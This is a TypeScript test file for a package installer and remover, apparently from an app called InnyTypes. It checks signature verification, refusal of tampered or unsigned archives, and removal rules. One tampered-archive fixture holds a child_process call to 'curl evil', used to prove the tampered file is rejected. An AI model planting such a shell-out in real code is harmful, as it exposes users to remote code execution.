// Install and removal (application/install-package.ts, remove-package.ts; WI-0018-16) with the
// real disk adapters: signed archives verified with the real minisign verifier, swapped into a
// real (sealed) live root and listed by the real InstalledPackageStore. Only the catalogue,
// the HTTP fetch, the flows in use and the runtime's restart are stand-ins.
//
// The old tests this answers are tests/test_addons_cli.py's install rows (install only because
// a person asked, refuse a second install, stage then record) and tests/test_addons_remove.py
// (refuse while in use, then take everything).
import fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { FsContentHashes } from "../../src/adapters/fs/content-hashes";
import { DeclaredPackageStore } from "../../src/adapters/fs/declared-package-store";
import { InstalledPackageStore } from "../../src/adapters/fs/installed-package-store";
import { FsPackageRoots, unsealTree } from "../../src/adapters/fs/package-roots";
import { FsPackageSource } from "../../src/adapters/fs/package-source";
import { forgetGeneratedTypes } from "../../src/adapters/nodered/generator";
import { PackageEnvironmentBuilder } from "../../src/adapters/process/env-builder";
import { AjvSchemaValidator } from "../../src/adapters/schema/ajv-validator";
import { sha256Hex } from "../../src/adapters/signature/digest";
import { MinisignVerifier } from "../../src/adapters/signature/minisign";
import {
  isArchiveFile,
  OneAtATime,
  PackageInstaller,
  packageNameOf,
  type PackageInstallerPorts,
} from "../../src/application/install-package";
import { PackageRemover, typesOf, type TypesInUse } from "../../src/application/remove-package";
import type { CatalogueEntry, PackageCatalogue } from "../../src/domain/packages/catalogue";
import type { HttpGetResult } from "../../src/ports/http-client";
import { RecordingLogger } from "../fakes/children";
import { Signer } from "../fakes/minisign-signer";
import { signedArchive, tgz, type Files } from "../fakes/package-archive";

const ARCHIVE_URL = "https://catalogue.test/packages/pinger-0.1.0.tgz";

let base: string;
let roots: FsPackageRoots;
let logger: RecordingLogger;
let signer: Signer;
let served: Map<string, Uint8Array>;
let entries: CatalogueEntry[];
let catalogueFails: Error | null;
let restarts: string[];
let restartTook: number | null;
let inUse: TypesInUse | Error;
let generatedDir: string;
let shippedRoot: string;

beforeEach(() => {
  base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "inny-install-")));
  roots = new FsPackageRoots(path.join(base, "node-packages"));
  logger = new RecordingLogger();
  signer = new Signer();
  served = new Map();
  entries = [entry("pinger", ARCHIVE_URL)];
  catalogueFails = null;
  restarts = [];
  restartTook = 312;
  inUse = { deployed: [], undeployed: [] };
  generatedDir = path.join(base, "generated");
  shippedRoot = path.join(base, "shipped");
  // One shipped package, as packages/anytype ships with the app.
  fs.mkdirSync(path.join(shippedRoot, "anytype"), { recursive: true });
  fs.writeFileSync(
    path.join(shippedRoot, "anytype", "inny-package.json"),
    declaration("anytype", "1.0.0"),
  );
});

afterEach(() => {
  unsealTree(base);
  fs.rmSync(base, { recursive: true, force: true });
});

function entry(id: string, archive?: string, verified = true): CatalogueEntry {
  return {
    packageId: id,
    summary: `The ${id} package.`,
    installSource: "index",
    catalogue: "official",
    verified,
    ...(archive === undefined ? {} : { archive }),
  };
}

function declaration(name: string, version: string): string {
  return JSON.stringify({
    protocol: 2,
    package: name,
    version,
    environment: { kind: "node", node: ">=22" },
    types: [
      {
        id: "ping",
        kind: "node",
        label: "Ping",
        command: ["{node}", "{package}/node.js"],
        config: { type: "object" },
        outputs: [{ port: "out", event: `${name}.out.v1` }],
      },
    ],
  });
}

const packageFiles = (name = "pinger", version = "0.1.0"): Files => ({
  "inny-package.json": declaration(name, version),
  "node.js": "process.stdout.write('')\n",
});

/** A builder whose runtimes throw: a node package needs neither uv nor Python. */
const builder = new PackageEnvironmentBuilder({
  locator: {
    uv: () => {
      throw new Error("uv was asked for");
    },
    python: () => {
      throw new Error("python was asked for");
    },
    node: () => {
      throw new Error("node was asked for");
    },
  },
  parentEnvironment: {},
  cacheDir: "unused",
  wheels: { kind: "default" },
  timeoutMs: 1,
  platform: process.platform,
});

const shipped = () => new DeclaredPackageStore([shippedRoot], logger);

/** The shipped package as the Packages page lists it: no origin, no mode, no update line. */
const SHIPPED_ANYTYPE = {
  name: "anytype",
  version: "1.0.0",
  kind: "shipped",
  signed: true,
  from: null,
  mode: null,
  update: null,
} as const;

function installerPorts(overrides: Partial<PackageInstallerPorts> = {}): PackageInstallerPorts {
  return {
    environment: {
      source: new FsPackageSource(),
      verifier: new MinisignVerifier(),
      validator: new AjvSchemaValidator(),
      contentHashes: new FsContentHashes(path.join(base, "content-hashes.json")),
      roots,
      builder,
      logger,
      sha256: sha256Hex,
      target: { platform: process.platform, arch: process.arch },
    },
    catalogue: (): Promise<PackageCatalogue> =>
      catalogueFails === null
        ? Promise.resolve({
            name: "official",
            url: "https://catalogue.test/catalogue.json",
            verified: true,
            fetchedAt: 0,
            entries,
          })
        : Promise.reject(catalogueFails),
    catalogueKey: signer.publicKeyText,
    sources: () => [],
    registered: () => Promise.reject(new Error("no source is registered here")),
    http: {
      get: (url: string): Promise<HttpGetResult> => {
        const body = served.get(url);
        return Promise.resolve(
          body === undefined
            ? { ok: false, failure: "status", detail: `${url} answered 404` }
            : { ok: true, body },
        );
      },
    },
    saveDownload: (name, bytes) => {
      const file = path.join(base, "downloads", `${name}.tgz`);
      fs.mkdirSync(path.dirname(file), { recursive: true });
      fs.writeFileSync(file, bytes);
      return file;
    },
    shipped: () =>
      shipped()
        .documents()
        .map(({ name }) => ({ name, version: "1.0.0" })),
    restartRuntime: (reason) => {
      restarts.push(reason);
      return Promise.resolve(restartTook);
    },
    logger,
    ...overrides,
  };
}

function setUp(overrides: Partial<PackageInstallerPorts> = {}) {
  const one = new OneAtATime();
  const installer = new PackageInstaller(installerPorts(overrides), one);
  const remover = new PackageRemover(
    {
      roots,
      typesInUse: () => (inUse instanceof Error ? Promise.reject(inUse) : Promise.resolve(inUse)),
      forgetGenerated: (name) => {
        forgetGeneratedTypes(generatedDir, name);
      },
      shipped: () => shipped().packages(),
      restartRuntime: (reason) => {
        restarts.push(reason);
        return Promise.resolve(restartTook);
      },
      logger,
    },
    one,
  );
  return { installer, remover };
}

/** Every declaration anywhere under the install base: none may exist before verification. */
function declarationsWritten(): string[] {
  const root = path.join(base, "node-packages");
  if (!fs.existsSync(root)) {
    return [];
  }
  return fs
    .readdirSync(root, { recursive: true, encoding: "utf8" })
    .filter((file) => path.basename(file) === "inny-package.json");
}

function folderOf(files: Files): string {
  const folder = fs.mkdtempSync(path.join(base, "folder-"));
  for (const [file, data] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(folder, file)), { recursive: true });
    fs.writeFileSync(path.join(folder, file), data);
  }
  return folder;
}

describe("install from the catalogue", () => {
  it("fetches the signed archive, verifies it, swaps it in, and restarts only the runtime", async () => {
    served.set(ARCHIVE_URL, signedArchive(packageFiles(), signer));
    const { installer } = setUp();
    expect(await installer.installFromCatalogue("pinger")).toEqual({
      ok: true,
      message: "pinger 0.1.0 is installed. Its types are in the editor's palette.",
    });
    expect(roots.installed("pinger")).toMatchObject({ version: "0.1.0", signed: true });
    expect(restarts).toEqual(["pinger was installed"]);
    expect(logger.lines).toContainEqual(
      expect.stringContaining(
        "install: pinger 0.1.0 is live; only the runtime restarted, in 312 ms (P11a)",
      ),
    );
    // The runtime reads it from its own folder, beside the shipped ones.
    const store = new InstalledPackageStore(shipped(), roots, logger);
    expect(store.packages()).toEqual(["anytype", "pinger"]);
    expect(store.shippedNames()).toEqual(["anytype"]);
    expect(store.documents().find((stored) => stored.name === "pinger")).toMatchObject({
      folder: path.join(roots.live, "pinger", "package"),
      installed: true,
      signed: true,
    });
  });

  it("refuses a tampered archive before anything is written, and restarts nothing", async () => {
    served.set(
      ARCHIVE_URL,
      signedArchive(packageFiles(), signer, {
        after: { "node.js": "require('child_process').exec('curl evil')\n" },
      }),
    );
    const { installer } = setUp();
    const outcome = await installer.installFromCatalogue("pinger");
    expect(outcome).toEqual({
      ok: false,
      error: "Not installed: node.js does not match its sha256 in files.json",
    });
    // The declaration never reached any folder: not the live root, not even staging.
    expect(declarationsWritten()).toEqual([]);
    expect(roots.list()).toEqual([]);
    expect(restarts).toEqual([]);
  });

  it("refuses an archive signed by another key", async () => {
    served.set(ARCHIVE_URL, signedArchive(packageFiles(), new Signer()));
    const outcome = await setUp().installer.installFromCatalogue("pinger");
    expect(outcome.ok).toBe(false);
    expect(!outcome.ok && outcome.error).toMatch(/files\.json is not signed by this source's key/);
    expect(declarationsWritten()).toEqual([]);
  });

  it("refuses a second install of an installed package: remove it first", async () => {
    served.set(ARCHIVE_URL, signedArchive(packageFiles(), signer));
    const { installer } = setUp();
    await installer.installFromCatalogue("pinger");
    expect(await installer.installFromCatalogue("pinger")).toEqual({
      ok: false,
      error: "Not installed: pinger 0.1.0 is already installed; remove it first.",
    });
    // Another version, and the same name from a developer's folder, are refused the same way:
    // updating is not installing again.
    expect(
      await installer.installFromFile(folderOf(packageFiles("pinger", "0.2.0")), true),
    ).toEqual({
      ok: false,
      error: "Not installed: pinger 0.1.0 is already installed; remove it first",
    });
    expect(roots.installed("pinger")).toMatchObject({ version: "0.1.0", signed: true });
    expect(restarts).toHaveLength(1);
  });

  it("refuses an install over a record that cannot be read, and removes nothing blind", async () => {
    served.set(ARCHIVE_URL, signedArchive(packageFiles(), signer));
    const { installer, remover } = setUp();
    await installer.installFromCatalogue("pinger");
    unsealTree(roots.live);
    fs.writeFileSync(path.join(roots.live, "pinger", "installed.json"), "{");
    const again = await installer.installFromCatalogue("pinger");
    expect(!again.ok && again.error).toMatch(
      /^Not installed: pinger is installed, and its record cannot be read \(.*\); remove it first\.$/,
    );
    const removal = await remover.remove("pinger");
    expect(!removal.ok && removal.error).toMatch(
      /^Not removed: its record cannot be read \(.*\), so nothing is removed\.$/,
    );
    expect(fs.existsSync(path.join(roots.live, "pinger", "package", "node.js"))).toBe(true);
    // Unreadable, it is listed nowhere.
    expect(roots.list()).toEqual([]);
  });

  it("refuses an entry it cannot install, an unverified catalogue, and a fetch that fails", async () => {
    entries = [
      entry("oldstyle"),
      entry("pinger", ARCHIVE_URL, false),
      entry("gone", "https://catalogue.test/gone.tgz"),
    ];
    const { installer } = setUp();
    expect(await installer.installFromCatalogue("oldstyle")).toEqual({
      ok: false,
      error:
        'Not installed: its catalogue entry names only "index", and this build installs ' +
        "packages from an archive only.",
    });
    expect(await installer.installFromCatalogue("pinger")).toEqual({
      ok: false,
      error: "Not installed: the catalogue is not signed, so nothing it offers is verified.",
    });
    expect(await installer.installFromCatalogue("gone")).toEqual({
      ok: false,
      error:
        "Not installed: its archive could not be fetched: https://catalogue.test/gone.tgz answered 404.",
    });
    expect(await installer.installFromCatalogue("absent")).toEqual({
      ok: false,
      error: "Not installed: the catalogue does not list it.",
    });
    catalogueFails = new Error("no route to host");
    expect(await installer.installFromCatalogue("pinger")).toEqual({
      ok: false,
      error: "Not installed: the catalogue could not be read: no route to host.",
    });
  });

  it("refuses the name of a shipped package, and an archive that is not the entry's package", async () => {
    entries = [entry("anytype", ARCHIVE_URL), entry("pinger", ARCHIVE_URL)];
    const { installer } = setUp();
    expect(await installer.installFromCatalogue("anytype")).toEqual({
      ok: false,
      error: "Not installed: anytype is the name of a package shipped with InnyTypes.",
    });
    served.set(ARCHIVE_URL, signedArchive(packageFiles("other"), signer));
    expect(await installer.installFromCatalogue("pinger")).toEqual({
      ok: false,
      error: "Not installed: the catalogue offers pinger, and the archive declares other",
    });
    expect(declarationsWritten()).toEqual([]);
  });

  it("refuses with no catalogue key", async () => {
    served.set(ARCHIVE_URL, signedArchive(packageFiles(), signer));
    const outcome = await setUp({ catalogueKey: null }).installer.installFromCatalogue("pinger");
    expect(outcome.ok).toBe(false);
    expect(roots.list()).toEqual([]);
  });
});

describe("install from a file, for developers", () => {
  it("is refused unless the person confirmed it is unsigned", async () => {
    const folder = folderOf(packageFiles());
    expect(await setUp().installer.installFromFile(folder, false)).toEqual({
      ok: false,
      error:
        `${folder} is not signed: nobody vouches for its code. It is installed only once you ` +
        "confirm that you want it anyway.",
      needsConfirmation: true,
    });
    expect(roots.list()).toEqual([]);
    expect(restarts).toEqual([]);
  });

  it("installs a confirmed folder, recorded and listed as unsigned", async () => {
    const { installer } = setUp();
    const folder = folderOf(packageFiles());
    expect(await installer.installFromFile(folder, true)).toEqual({
      ok: true,
      message: "pinger 0.1.0 is installed, unsigned. Its types are in the editor's palette.",
    });
    expect(roots.installed("pinger")?.signed).toBe(false);
    expect(logger.lines).toContainEqual(expect.stringContaining("(unsigned); only the runtime"));
    const state = await installer.state();
    expect(state.packages).toEqual([
      { ...SHIPPED_ANYTYPE },
      {
        name: "pinger",
        version: "0.1.0",
        kind: "installed",
        signed: false,
        from: folder,
        mode: null,
        update: null,
      },
    ]);
    expect(roots.installed("pinger")?.origin).toEqual({ kind: "file", path: folder });
    expect(state.catalogue).toEqual([
      {
        id: "pinger",
        name: "pinger",
        summary: "The pinger package.",
        source: "official",
        version: null,
        shadowedBy: null,
        installable: true,
        installed: true,
        verified: true,
      },
    ]);
  });

  it("installs a confirmed .tgz as unsigned, even one that carries a signature", async () => {
    const file = path.join(base, "pinger.tgz");
    fs.writeFileSync(file, signedArchive(packageFiles(), signer));
    expect((await setUp().installer.installFromFile(file, true)).ok).toBe(true);
    expect(roots.installed("pinger")?.signed).toBe(false);
    const bare = path.join(base, "bare.tar.gz");
    fs.writeFileSync(bare, tgz(packageFiles("bare")));
    expect((await setUp().installer.installFromFile(bare, true)).ok).toBe(true);
    expect(isArchiveFile(bare)).toBe(true);
    expect(isArchiveFile(path.join(base, "folder"))).toBe(false);
  });

  it("refuses a file that is neither a package folder nor an archive", async () => {
    const file = path.join(base, "notes.txt");
    fs.writeFileSync(file, "not a package");
    const outcome = await setUp().installer.installFromFile(file, true);
    expect(!outcome.ok && outcome.error).toMatch(/^Not installed: it cannot be read: /);
    expect(declarationsWritten()).toEqual([]);
  });

  it("refuses a shipped name from a file too, before anything is written", async () => {
    const outcome = await setUp().installer.installFromFile(
      folderOf(packageFiles("anytype")),
      true,
    );
    expect(outcome).toEqual({
      ok: false,
      error: "Not installed: anytype is the name of a package shipped with InnyTypes",
    });
    expect(declarationsWritten()).toEqual([]);
  });
});

describe("one at a time", () => {
  it("refuses an install asked for while another runs", async () => {
    let release: (value: number) => void = () => undefined;
    const { installer } = setUp({
      restartRuntime: () => new Promise((resolve) => (release = resolve)),
    });
    const first = installer.installFromFile(folderOf(packageFiles()), true);
    await new Promise((resolve) => setTimeout(resolve, 50));
    const second = await installer.installFromFile(folderOf(packageFiles("other")), true);
    expect(second.ok).toBe(false);
    expect(!second.ok && second.error).toMatch(/^The install of .* is still going on/);
    release(10);
    expect((await first).ok).toBe(true);
  });
});

describe("the Packages page's listing", () => {
  it("says why no catalogue could be listed, and still lists the packages", async () => {
    catalogueFails = new Error("this build is configured with no package catalogue");
    expect(await setUp().installer.state()).toEqual({
      packages: [SHIPPED_ANYTYPE],
      catalogue: [],
      catalogueProblem: "this build is configured with no package catalogue",
      sources: [],
      sourcesProblem: null,
      checkedAt: null,
    });
  });

  it("maps a catalogue id to its package name", () => {
    expect(packageNameOf("my-package")).toBe("my_package");
  });
});

describe("removal", () => {
  async function installed(): Promise<ReturnType<typeof setUp>> {
    const set = setUp();
    await set.installer.installFromFile(folderOf(packageFiles()), true);
    restarts.length = 0;
    return set;
  }

  it("is refused while a deployed flow uses its types", async () => {
    const { remover } = await installed();
    inUse = { deployed: ["tab", "inny-pinger-ping", "debug"], undeployed: null };
    expect(await remover.remove("pinger")).toEqual({
      ok: false,
      error:
        "Not removed: the deployed flows use inny-pinger-ping; delete those nodes (and deploy) " +
        "before removing it.",
    });
    expect(roots.installed("pinger")).toBeDefined();
    expect(restarts).toEqual([]);
  });

  it("is refused while an undeployed flow in the editor uses its types", async () => {
    const { remover } = await installed();
    inUse = { deployed: [], undeployed: ["inny-pinger-ping", "inject"] };
    expect(await remover.remove("pinger")).toEqual({
      ok: false,
      error:
        "Not removed: the editor's undeployed flows use inny-pinger-ping; delete those nodes " +
        "(and deploy) before removing it.",
    });
    expect(roots.installed("pinger")).toBeDefined();
  });

  it("is refused when it cannot be told whether a flow uses it", async () => {
    const { remover } = await installed();
    inUse = new Error("flows.json is not JSON");
    const outcome = await remover.remove("pinger");
    expect(!outcome.ok && outcome.error).toBe(
      "Not removed: it cannot be told whether a flow uses it: flows.json is not JSON.",
    );
  });

  it("otherwise takes the environment, the record and the generated modules, and restarts only the runtime", async () => {
    const { remover } = await installed();
    fs.mkdirSync(generatedDir, { recursive: true });
    for (const file of ["inny-pinger-ping.js", "inny-pinger-ping.html", "inny-other-x.js"]) {
      fs.writeFileSync(path.join(generatedDir, file), "");
    }
    // Another package's type in use does not hold this one.
    inUse = { deployed: ["inny-pingerx-ping"], undeployed: ["inny-other-x"] };
    expect(await remover.remove("pinger")).toEqual({
      ok: true,
      message: "pinger 0.1.0 is removed.",
    });
    expect(roots.installed("pinger")).toBeUndefined();
    expect(fs.existsSync(path.join(roots.live, "pinger"))).toBe(false);
    expect(fs.readdirSync(generatedDir)).toEqual(["inny-other-x.js"]);
    expect(restarts).toEqual(["pinger was removed"]);
    expect(logger.lines).toContainEqual(
      expect.stringContaining("only the runtime restarted, in 312 ms"),
    );
    // Installed again: the same content under the same version is welcome.
    expect((await setUp().installer.installFromFile(folderOf(packageFiles()), true)).ok).toBe(true);
  });

  it("is refused for a shipped package and for one not installed", async () => {
    const { remover } = setUp();
    expect(await remover.remove("anytype")).toEqual({
      ok: false,
      error: "Not removed: anytype is shipped with InnyTypes and cannot be removed.",
    });
    expect(await remover.remove("pinger")).toEqual({
      ok: false,
      error: "Not removed: pinger is not installed.",
    });
  });

  it("says when the runtime was not running to restart", async () => {
    const { remover } = await installed();
    restartTook = null;
    expect((await remover.remove("pinger")).ok).toBe(true);
    expect(logger.lines).toContainEqual(expect.stringContaining("the runtime was not running"));
  });

  it("finds a package's types by their prefix only", () => {
    expect(typesOf("pinger", ["inny-pinger-a", "inny-pinger-a", "inny-pingers-b", "x"])).toEqual([
      "inny-pinger-a",
    ]);
  });
});

describe("the installed-package store", () => {
  it("leaves out an installed package with a shipped name, and one that cannot be read", async () => {
    const { installer } = setUp();
    await installer.installFromFile(folderOf(packageFiles()), true);
    // As if the live root were tampered with: the installer itself refuses both.
    unsealTree(roots.live);
    fs.cpSync(path.join(roots.live, "pinger"), path.join(roots.live, "anytype"), {
      recursive: true,
    });
    fs.writeFileSync(
      path.join(roots.live, "anytype", "installed.json"),
      JSON.stringify({ package: "anytype", version: "9", signed: false }),
    );
    fs.cpSync(path.join(roots.live, "pinger"), path.join(roots.live, "broken"), {
      recursive: true,
    });
    fs.writeFileSync(
      path.join(roots.live, "broken", "installed.json"),
      JSON.stringify({ package: "broken", version: "1", signed: true }),
    );
    fs.writeFileSync(path.join(roots.live, "broken", "package", "inny-package.json"), "{");
    const store = new InstalledPackageStore(shipped(), roots, logger);
    expect(store.packages()).toEqual(["anytype", "pinger"]);
    expect(store.documents()[0]?.installed).toBe(false);
    store.documents();
    expect(logger.lines.filter((line) => line.includes("shipped with the app"))).toHaveLength(1);
    expect(logger.lines).toContainEqual(
      expect.stringContaining("installed package broken cannot be read"),
    );
  });

  it("gives a uv-python package its own interpreter", () => {
    const folder = roots.stage("snake");
    roots.writeFiles(
      folder.packageDir,
      new Map([["inny-package.json", new TextEncoder().encode(declaration("snake", "1.0.0"))]]),
    );
    roots.writeRecord(folder, {
      package: "snake",
      version: "1.0.0",
      contentHash: "0".repeat(64),
      environment: "uv-python",
      python: "environment/venv/bin/python",
      signed: true,
    });
    roots.swapIn("snake");
    const store = new InstalledPackageStore(shipped(), roots, logger);
    expect(store.documents().find((stored) => stored.name === "snake")?.python).toBe(
      path.join(roots.live, "snake", "environment", "venv", "bin", "python"),
    );
  });
});
